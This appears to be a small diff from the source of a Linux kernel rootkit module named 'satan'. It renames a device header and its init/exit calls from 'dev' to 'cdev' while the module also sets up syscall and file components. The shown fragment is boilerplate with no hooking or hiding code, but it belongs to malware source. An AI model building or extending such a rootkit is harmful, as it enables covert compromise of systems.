@@ -4,7 +4,7 @@
 #include <linux/module.h>
 #include <linux/uaccess.h>
 
-#include "dev.h"
+#include "cdev.h"
 #include "file.h"
 #include "module.h"
 #include "syscall.h"
@@ -13,7 +13,7 @@ static int __init satan_init(void)
 {
         pr_info("satan: initializing rootkit...\n");
 
-        satan_dev_init(THIS_MODULE);
+        satan_cdev_init(THIS_MODULE);
         satan_syscall_init();
         satan_file_init();
 
@@ -29,7 +29,7 @@ static void __exit satan_exit(void)
 
         satan_file_exit();
         satan_syscall_exit();
-        satan_dev_exit();
+        satan_cdev_exit();
 }
 
 module_init(satan_init);
